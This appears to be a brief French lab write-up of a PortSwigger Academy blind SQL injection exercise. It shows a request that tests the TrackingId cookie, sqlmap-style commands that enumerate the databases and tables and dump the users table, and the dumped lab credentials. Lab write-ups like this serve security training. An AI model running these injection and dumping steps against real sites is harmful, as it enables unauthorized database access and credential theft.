# Lab

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

## Request

```
GET / HTTP/2
Host: 0a3e008a03da4dd186d418a300c300bc.web-security-academy.net
Cookie: TrackingId=zaMsKdYi4djGyz81'; session=HjnHs9XpymRNoBiDORv3c5g6w6gqzDbD
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="111", "Not(A:Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3e008a03da4dd186d418a300c300bc.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
```

Cookie TrackingId vulnerable à une injection SQL.

## Exploit

Lister les BDD :

```
https://0a3e008a03da4dd186d418a300c300bc.web-security-academy.net/ --cookie=TrackingId=zaMsKdYi4djGyz81 --level=5 --risk=3 --dbs
```

Une seule DB : `public`

Lister les tables :

```
https://0a3e008a03da4dd186d418a300c300bc.web-security-academy.net/ --cookie=TrackingId=zaMsKdYi4djGyz81 --level=5 --risk=3 -D public --tables
```

Plusieurs tables :

```
+----------+
| tracking |
| users    |
+----------+
```

Lister les données de la table users :

```
https://0a3e008a03da4dd186d418a300c300bc.web-security-academy.net/ --cookie=TrackingId=zaMsKdYi4djGyz81 --level=5 --risk=3 -D public -T users --dump
```

plusieurs users :

```
+----------------------+---------------+
| password             | username      |
+----------------------+---------------+
| 9t0om0eeddbmfia7dlwt | wiener        |
| lic71i95lgfu8qdgdp7k | administrator |
| t4f8q86h2flz3aco07t1 | carlos        |
+----------------------+---------------+
```